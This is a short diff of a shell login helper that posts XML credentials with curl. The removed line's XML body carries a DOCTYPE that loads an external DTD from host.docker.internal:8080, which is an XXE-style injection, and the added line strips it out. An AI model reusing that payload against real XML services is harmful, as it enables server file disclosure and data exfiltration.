@@ -14,7 +14,7 @@ do_login() {
     cookie_file="~/cookies_${email//[^a-zA-Z0-9]/_}.txt"
     
     # Login response passthrough
-    curl -sS -i -c "$cookie_file" -b "$cookie_file" -X POST -H "Content-Type: text/xml; charset=UTF-8" -d "<!DOCTYPE login SYSTEM \"http://host.docker.internal:8080/request.dtd\"><login><email>$email</email><password>$password</password></login>" restapi/login | egrep -v '(^HTTP\/.*$)' | sed 's/Transfer\-Encoding.*/Connection\: close/ig'
+    curl -sS -i -c "$cookie_file" -b "$cookie_file" -X POST -H "Content-Type: text/xml; charset=UTF-8" -d "<login><email>$email</email><password>$password</password></login>" restapi/login | egrep -v '(^HTTP\/.*$)' | sed 's/Transfer\-Encoding.*/Connection\: close/ig'
 }
 
 
